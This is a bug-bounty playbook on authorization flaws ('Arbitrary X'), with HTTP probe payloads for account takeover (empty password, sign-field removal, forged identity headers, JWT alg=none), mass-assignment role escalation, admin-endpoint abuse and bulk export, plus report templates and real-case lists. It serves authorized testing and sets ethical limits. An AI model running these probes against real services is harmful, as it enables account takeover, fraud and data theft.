# Arbitrary X Sub-Authorization — a "permission-dimension" flaw even nastier than IDOR

> Perspective: black-box
> Relationship to `logic-flaws.md` §3.2 (IDOR): IDOR = accessing "someone else's" resource; this playbook = performing "an operation you shouldn't have," **regardless of who owns the resource**.
> Data basis: 529 real-world cases, sub-category high-severity ratio 51%–86.4%.

---

## 1. One-sentence distinction

```
IDOR (62.3% high-sev)        : A changes ID → reads/modifies B's resource
Arbitrary X (51%–86.4% high) : A directly invokes an "approve/delete/create-admin" endpoint, bypassing the entire permission model
```

IDOR is "stealing within a dimension"; Arbitrary X is "crossing dimensions" — using a regular user as an admin/system/auditor.

SRC value: **arbitrary account** (86.4% high-sev) is nearly equivalent to RCE; **arbitrary user registration** (75%) enables mass abuse or building phishing infrastructure; **arbitrary operation** (72.5%) is usually equivalent to "site-wide admin."

---

## 2. 6 sub-categories × high-severity ratio

| Sub-category | Cases | High-sev ratio | One-liner | Primary hunting surface |
|------|--------|---------|--------|----------|
| **Arbitrary account / arbitrary login** | 220 | **86.4%** | Obtain a token as any user without a password | login, SSO, third-party login callbacks |
| **Arbitrary user registration** | 24 | **75.0%** | Bypass invitation/email-domain/phone-binding | registration endpoints, SSO registration callbacks |
| **Arbitrary modification** | 159 | **63.5%** | Modify any record (no owner restriction) | profile/config/content write endpoints |
| **Arbitrary view** | 45 | **55.6%** | Bulk export / admin view / global search | reports, exports, admin search |
| **Arbitrary operation** | 40 | **72.5%** | Approve/publish/execute privileged operations | review, listing/delisting, refund approval, card issuance |
| **Arbitrary deletion** | 41 | **51.2%** | Delete any record without ownership check | DELETE / `?action=del` |

---

## 3. Arbitrary account — the most valuable sub-category (86.4%)

### 3.1 6 typical forms (all distilled from real cases)

#### Form A: Login endpoint accepts empty password / client-side forgery

```http
POST /api/login HTTP/1.1
{"username":"admin","password":""}

→ 200, token=xxx
```

Or:

```http
POST /api/login HTTP/1.1
{"username":"victim","client_signature":"xxx","timestamp":1234567890}
```

The server only validates `client_signature` (a reversible client-side algorithm) + timestamp, and **does not validate the password**.

**Probe**: set the `password` field to empty / remove it / set it to `null` / set it to `["",""]`, and compare responses.

#### Form B: SSO callback can be forged

```
Login page → redirect to SSO → callback /sso/callback?username=admin&sign=xxx
```

If `sign` is computed with a client-visible key / not validated, or the callback directly trusts `username` → arbitrary account.

**Probe**: capture the callback packet, change `username` to `admin` and resend.

#### Form C: sign field can be bypassed

```http
POST /api/login HTTP/1.1
{"phone":"13888888888","sign":"abc..."}

# remove sign  or  sign="null"  or  sign=""
{"phone":"13888888888"}                    → 200 takeover
{"phone":"13888888888","sign":""}          → 200 takeover
{"phone":"13888888888","sign":"00000000"}  → 200 takeover (hash check disabled)
```

**Probe**: remove / empty / all-zero replace the sign field.
Real case: Yupaopao APP arbitrary user login (sign bypass → arbitrary balance operation).

#### Form D: One-click phone login binding flaw

```
1. Own phone 13888888888 receives token_a
2. Directly use token_a to call /api/loginByToken?token=token_a&phone=victim
   → server only checks token_a validity, does not verify token_a is bound to victim
```

**Probe**: in the "one-click phone login" flow, change the `phone` field and check whether you log into the victim's account.

#### Form E: JWT algorithm / kid switching

See `oauth-saml-jwt.md` for details. In brief:
- `alg=none` accepted
- `alg=HS256` using the RS256 public key as the HMAC secret
- `kid` path traversal reading `/dev/null` as the key

#### Form F: Cookie / Header directly trusted

Real case: Fujian NetDragon wooyun-2015-0157092 — `?userAccount=admin` directly writes a Cookie to enter the backend.

**Probe**:
```
Cookie: userId=1; userAccount=admin; isAdmin=1; role=admin
X-User-Id: 1
X-Real-User: admin
X-Original-User: admin
```

### 3.2 How to write up an arbitrary-account report

```
[P0][Unauthenticated → takeover of any account] /api/login sign field empty-value bypass

Reproduction:
1. POST /api/login {"phone":"13888888888","sign":"abc"} → received token_self
2. POST /api/login {"phone":"victim_phone","sign":""}    → directly received victim's token
3. Use the token to call /api/userInfo → returns victim's profile

Business impact: any phone number can be used to take over an account. Proven using two
        of the researcher's own test accounts; no real users were accessed.
```

CVSS 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).

---

## 4. Arbitrary user registration (75.0%)

### 4.1 5 typical bypasses

| Bypass type | Probe | Effect |
|---------|------|------|
| Skip invitation code | capture registration packet, remove `inviteCode` field | force entry |
| Email allowlist bypass | `attacker@victim.com.attacker.com` / `attacker+@victim.com` / IDN homoglyphs | impersonate internal employee |
| Skip SMS verification | capture both "enter phone → send code" and "submit registration" packets, directly craft `verified=true` in the registration packet | register a fake phone number |
| Directly call `setRole` | immediately after registering, call `/api/profile/update {"role":"admin"}` | admin upon registration |
| Add admin fields during registration | `POST /register {"username":"x","password":"y","role":"admin","is_admin":true,"level":9}` | admin upon registration |

**Primary surface**: internal employee systems, SaaS backends, enterprise customer portals, invitation-only communities.

### 4.2 Probe checklist

```bash
# 1. Capture a normal registration packet, add admin markers field by field
POST /api/register
{"username":"hunter1","password":"x","role":"admin"}
{"username":"hunter2","password":"x","is_admin":true}
{"username":"hunter3","password":"x","admin":1}
{"username":"hunter4","password":"x","level":9,"role_id":1}
{"username":"hunter5","password":"x","permissions":["*"]}

# 2. Check whether the registration response contains a role field — if so, the next request can modify it
# 3. Immediately after successful registration, test: can you access /admin/* ?
```

---

## 5. Arbitrary operation (72.5%) — the most easily underestimated

### 5.1 Operation type identification

Any endpoint whose name contains the following words is a suspect for "arbitrary operation":

```
approve / audit / verify / review / publish / unpublish
withdraw / refund / cancel / settle / payout
ban / unban / lock / unlock / freeze
deploy / rollback / sync / refresh
sendCard / generateCode / issueCoupon
```

### 5.2 Three most common probe forms

#### Form A: Self-review, self-approve

```
1. Regular user hunter_a submits a "withdrawal request" → status pending
2. The same hunter_a calls /admin/withdraw/approve?id=requestID
   → withdrawal succeeds
```

**Root cause**: the approval endpoint only validates login state, not that role != requester.

#### Form B: Batch execution

```
GET /admin/users/banAll      # a regular user can call it, banning the entire site
POST /admin/cache/flushAll
POST /admin/coupon/issueAll  # issue a 100-yuan coupon to everyone
```

**Root cause**: admin endpoints are only hidden in the frontend, without server-side role checks.

#### Form C: Card issuance / top-up / refund generation

```
POST /api/recharge/genCard {"amount":1000,"count":100}
→ generates 100 top-up cards worth 1000 yuan each

POST /api/refund/create {"orderId":"xxx","amount":99999}
→ does not verify "whether the order really exists / whether it was paid", directly issues the refund
```

**Root cause**: finance/operations endpoints are directly exposed, with no "operating subject identity" check.

Real case: China Tietong billing system — arbitrary generation of top-up cards.

### 5.3 Discriminating questions for arbitrary operations

> How do you know an endpoint "should" be admin-only?

Clues:
1. **Path contains admin / manage / system / backend** → must test
2. **Response fields include status/state/auditState** → highly suspect (there is a review action)
3. **The operation has no "pending review" step but takes effect directly** → arbitrary-operation lurking point
4. **JS states "admin only" but the endpoint has no authorization** → textbook arbitrary operation
5. **The operation writes a log but the actor field is hard-coded to system / admin** → the server does not verify the real actor

---

## 6. Arbitrary modification / arbitrary view / arbitrary deletion

### 6.1 Arbitrary modification (63.5%) — the boundary with IDOR

IDOR: change `id=B` to modify B's resource (based on ID substitution).
Arbitrary modification: call `/api/admin/setAnnouncement` to change the site-wide announcement / call `/api/setSystemConfig` to change the system configuration.

**Primary surface**:
- `/api/system/config/*`
- `/api/announcement/*`
- `/api/global/*`
- `/api/setting/*`

**Probe**:
```bash
# Try system-level write endpoints with a regular account
POST /api/system/setMaintenance {"on":true}    # put the site into maintenance mode
POST /api/announcement/create {"text":"hi"}   # write a site-wide announcement
POST /api/global/email-template {"html":"<x>"} # change the site-wide email template (→ phishing)
```

### 6.2 Arbitrary view (55.6%) — bulk export scenarios

Not querying a single record, but **bulk export** or **global listing**:

```
GET /api/users/export?format=csv               # export all users
GET /api/orders/list?pageSize=99999            # page through all orders
GET /api/admin/search?keyword=                 # global search
GET /api/report/daily?date=2025-01-01          # financial daily report
```

**Probe**:
1. Find a list/export endpoint
2. Request it with a regular user token
3. Check whether the returned data is only your own (it should be)

### 6.3 Arbitrary deletion (51.2%) — test with caution

**SRC red line**: **arbitrary deletion is only proven, never actually executed**.

Proof method:
1. Find the endpoint (e.g. `DELETE /api/posts/{id}`)
2. Use the researcher's two test accounts to delete each other — proving A can delete B's resource
3. **Never delete real users' data** — even if you can

If you cannot prove it with two accounts (e.g. the target is `/api/admin/wipeAll`), **only capture JS / Burp evidence showing the endpoint is exposed + a curl without cookie showing whether 401/403 blocks it**, and never actually trigger it.

### 6.4 Vertical privilege escalation / roleid modification (a high-frequency mass-assignment sub-category)

In contrast to horizontal privilege escalation (IDOR: change `id=B` to view B's data), **vertical privilege escalation** means a regular user modifies a field to elevate themselves to admin / operations / customer service. The most common sink is a `role` / `roleid` / `permission` / `level` / `is_admin` field that the backend fails to filter out.

**Typical attack surface**:
- **Registration**: `POST /api/register` body stuffed with an extra `roleid=99` / `role=admin` / `permissions=["*"]` — if the backend mass-assigns the whole body to the user model, escalation is done
- **Profile update**: `PUT /api/user/profile` adding `role` / `groupId` — the profile endpoint does not allowlist fields
- **Admin invitation backfill**: when accepting an invitation, `inviteRole` is echoed back, and the backend trusts the frontend value
- **OIDC / SSO callback**: the callback body contains a `groups` array, and the backend directly persists it

**Probe (standard mass-assignment flow)**:

```bash
# 1. Capture a normal registration / profile-update packet, record the field set F0
POST /api/register {"username":"u","password":"p","email":"u@x"}

# 2. On top of F0, add admin-implying fields (try several at once; the backend may only filter one or two)
POST /api/register {"username":"u","password":"p","email":"u@x",
  "role":"admin",          "roleid":99,        "role_id":99,
  "is_admin":true,         "isAdmin":true,     "admin":true,
  "permissions":["*"],     "level":99,         "user_type":"admin",
  "groupId":1,             "tenantId":1,       "departmentId":1,
  "is_super":1,            "vip_level":99
}

# 3. Immediately verify: use the new account to request admin-only endpoints
GET /api/admin/users
GET /api/admin/stats
GET /api/system/config
```

**JSON nesting / casing / alias try-list**:
```text
"user":{"role":"admin"}        # nested
"User":{"Role":"admin"}        # PascalCase
"profile":{"isAdmin":true}     # camelCase nested
"meta":{"role_id":99}          # metadata field
"extra":{"admin":1}            # extension field
"_role":"admin"                # underscore prefix (some frameworks strip by default)
"role[]=admin"                 # form array
"role%00":"admin"              # null byte
```

**Response characteristics**:
- The returned JSON contains `role: "admin"` (backend echoes the field) → hit
- Immediately after registration, `/api/me` shows the role field → hit
- The token / session in the registration response decodes to contain an `admin` claim → hit

**Fix identification**:
- The backend has an explicit DTO / serializer allowlist → the field is dropped, response unchanged
- The backend uses ORM full-field hydration (Laravel `$fillable` set to `*`, Django ModelForm not restricting `fields`) → very likely a hit

**Red line**: after confirming escalation is possible, **only use `/api/me` to view the role field**; do not enter the admin backend and perform actual operations. A screenshot + the field difference is enough to prove impact.

---

## 7. Universal probing protocol (applies to all 6 sub-categories)

### 7.1 Dual-account + three-role testing

```
Account A (registration-tier)   Account B (registration-tier)   Account C (if obtainable — merchant/auditor)

For every write/delete/approve endpoint:
1. Call once with A (baseline, check whether it works)
2. Use A to call B's resource (→ IDOR)
3. Use A to call an endpoint only C should call (→ arbitrary operation / arbitrary modification)
4. Use A to call an endpoint only admin should call (→ arbitrary operation)
5. Call with no token at all (→ unauthenticated)
```

### 7.2 Endpoint discovery sources (by hit rate)

| Source | Hit rate | What to look for |
|------|--------|--------|
| Frontend JS (webpack unbundling) | High | all fetch/axios URLs, including "admin-only" ones |
| Wayback Machine | Medium | endpoints taken offline but still live on the server |
| sitemap.xml / robots.txt | Medium | "disallowed" hint paths |
| Swagger / api-docs | High | discover the full API dictionary (many targets leave swagger open) |
| APP decompilation + traffic capture | High | internal endpoints, admin endpoints, merchant endpoints |
| GitHub code search | Medium | outsourced company code, config samples, keys |
| Error pages / stack traces | Low | clues about internal paths |

### 7.3 Status-code semantics

| Status code | Meaning | Worth continuing to test? |
|--------|------|--------------|
| 200 + normal data | endpoint works, possibly missing a permission check | 🔴 immediately test for privilege escalation |
| 200 + `{"error":"..."}` | endpoint works, business-layer error | 🟠 change params and continue |
| 401 / 403 | authorization denied | 🟡 try bypass headers |
| 404 | wrong path or endpoint does not exist | 🟢 path variants |
| 405 | wrong method | 🟠 switch GET/POST/PUT/DELETE |
| 500 | server error | 🟠 read the error message for internal paths |

---

## 8. Real-case fingerprints

| Sub-category | Case | Fingerprint |
|------|------|------|
| Arbitrary account | Yupaopao APP arbitrary user login | sign field empty-value bypass |
| Arbitrary account | TCL unified auth platform can reset all users' passwords | SSO callback `userId=` controllable |
| Arbitrary account | Fujian NetDragon wooyun-2015-0157092 | `?userAccount=admin` directly writes a Cookie |
| Arbitrary modification | Longzhu live-streaming platform unauthorized modification of others' info | profile write endpoint does not check owner |
| Arbitrary operation | China Tietong billing system generating top-up cards | a regular account can call the card-issuance endpoint |
| Arbitrary operation | M1905, a 2588-yuan package for just 0.5 yuan | self-approval (create order + self-review) |
| Arbitrary view | A Beijing Hyundai platform's unauthorized traversal of millions of IDs | sequential file IDs with no ownership check |
| Arbitrary operation | Weixiaobao APP controlling 190k WeChat accounts with cash-out | endpoint does not validate the actor |

---

## 9. Report PoC template

```markdown
# [P0][Post-auth → arbitrary operation] /admin/withdraw/approve regular user can approve any withdrawal request

## Reproduction steps

### Setup
- Account A: a regular user registered by the researcher, user_id=10001
- Account B: a regular user registered by the researcher, user_id=10002

### Step 1: A submits a withdrawal request with a regular account (baseline)
POST /api/withdraw/apply
Authorization: Bearer A_token
{"amount":1.00}
→ 200 {"applyId":"PA20250509001","status":"pending"}

### Step 2: A calls the admin approval endpoint to approve its own request (the vulnerability)
POST /admin/withdraw/approve
Authorization: Bearer A_token   ← regular user token
{"applyId":"PA20250509001","decision":"approve"}
→ 200 {"status":"approved","amount":1.00}

### Step 3: Balance has been credited (screenshot)

### Step 4: Repeat with B — B's request can be approved the same way
(proving it is not a one-off, but a missing authorization on the endpoint)

## Business impact

Any user can bypass financial review and withdraw directly from the platform.
- Financial loss: theoretically unlimited (only limited by daily transfer quota)
- Scope: all users who can call /admin/withdraw/approve
- Attack complexity: a single HTTP request

## Test boundary
Each transaction in this test was 1 yuan, for a total of 2 yuan (A and B, 1 each);
the researcher is willing to return the 2 yuan to the vendor's account.

## Remediation advice
- Enforce RBAC on the /admin/* path; only role=auditor may call it
- Introduce an "applicant != approver" check in financial approval
- Server-side record the actor's true identity and compare against the requester
```

CVSS: `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H = 8.8` — close to RCE.

---

## 10. Things not to do

- **Forbidden**: using an arbitrary account to log into someone's real account to view data. Always use two of the researcher's own test accounts to test against each other.
- **Forbidden**: arbitrary deletion of real data. Even if the endpoint allows it.
- **Forbidden**: initiating real refunds/transfers in an arbitrary operation. Stop as soon as you prove "the endpoint returns success," and immediately contact the vendor / SRC support to verify whether a rollback is needed.
- **Forbidden**: using a high-privilege account like `admin@victim.com` during arbitrary user registration — use the researcher's own email suffix (hunter+1@yourdomain).
- **Forbidden**: arbitrary modification of the site-wide announcement / email template. A single change will be spotted by operations immediately and affects real users. Stop as soon as you prove "the endpoint works + 200."

---

## 11. Links to other playbooks

- "Within-dimension" testing for privilege escalation / IDOR → `playbooks/logic-flaws.md` §3.2
- API design-layer flaws (mass assignment / BOLA) → `playbooks/api-rest.md`
- Arbitrary account at the JWT / SSO / OAuth layer → `playbooks/oauth-saml-jwt.md`
- Finding endpoints via information disclosure → `playbooks/info-disclosure.md`
- Misconfiguration (admin path directly exposed) → `playbooks/unauth-access.md`

## H1 real cases

_A total of 465 disclosed HackerOne High/Critical reports hit this category, sorted by (bounty + votes×100), taking the Top 12_

| Severity | $ | Program | Title (click for the original report) | Summary |
|---|--:|---|---|---|
| Critical | 35000 usd | GitLab | [Account Takeover via Password Reset without user interactions](https://hackerone.com/reports/2293343) | Account Takeover via Password Reset without user interactions |
| High | 15000 usd | Snapchat | [Delete anyone's content spotlight remotely.](https://hackerone.com/reports/1819832) | Hello Snapchat, Snapchat has viral video feature callled spotlight which alone was the biggest trend and increase snapchat user… |
| High | 10500 usd | PayPal | [IDOR to add secondary users in www.paypal.com/businessmanage/users/api/v1/users](https://hackerone.com/reports/415081) | IDOR to add secondary users in www.paypal.com/businessmanage/users/api/v1/users |
| Critical | 11000 usd | GitLab | [Exfiltrate and mutate repository and project data through injected templated service](https://hackerone.com/reports/446585) | The GitLab import feature contains a vulnerability that allows an attacker to import a project that creates a service template |
| High | — | HackerOne | [Email address of any user can be queried on Report Invitation GraphQL type when username is known](https://hackerone.com/reports/792927) | Summary:** Email id of all hackerone users disclosure Description:** There is an flaw , with that i can get all hackerone users… |
| Critical | — | Upserve  | [Ability to reset password for account](https://hackerone.com/reports/322985) | Ability to reset password for account |
| Critical | 12000 usd | GitLab | [Project Template functionality can be used to copy private project data, such as repository, conf…](https://hackerone.com/reports/689314) | I've found a three minor vulnerabilities which, when combined, allow an attacker to copy private repositories, confidential iss… |
| Critical | — | Snapchat | [Publicly accessible Continuous Integration Tool](https://hackerone.com/reports/313457) | Publicly accessible Continuous Integration Tool |
| Critical | — | Shopify | [Email Confirmation Bypass in your-store.myshopify.com which leads to privilege escalation](https://hackerone.com/reports/910300) | Hello Shopify, I have found a bug by which I can verify any email on .myshopify.com, the bug is very strange but it works |
| Critical | — | Reddit | [One-click account hijack for anyone using Apple sign-in with Reddit, due to response-type switch …](https://hackerone.com/reports/1567186) | Hi, Description I've been researching new ways to steal OAuth codes and access-tokens using postMessage, and I found a way for … |
| High | 12500 usd | HackerOne | [IDOR - Delete all Licenses and certifications from users account using CreateOrUpdateHackerCertif…](https://hackerone.com/reports/2122671) | Summary:** Hey team, While editing our **Licenses and certifications** if we change the ID number we can delete other users **L… |

**Weakness distribution for hits in this category:**

- Improper Access Control - Generic: 203 entries
- Privilege Escalation: 122 entries
- Insecure Direct Object Reference (IDOR): 97 entries
- Uncategorized → manually classified: 17 entries
- Improper Authorization: 15 entries
- Incorrect Authorization: 4 entries
- Forced Browsing: 2 entries
- Missing Authorization: 2 entries
- Incorrect Privilege Assignment: 1 entry
- Improper Privilege Management: 1 entry
- Execution with Unnecessary Privileges: 1 entry
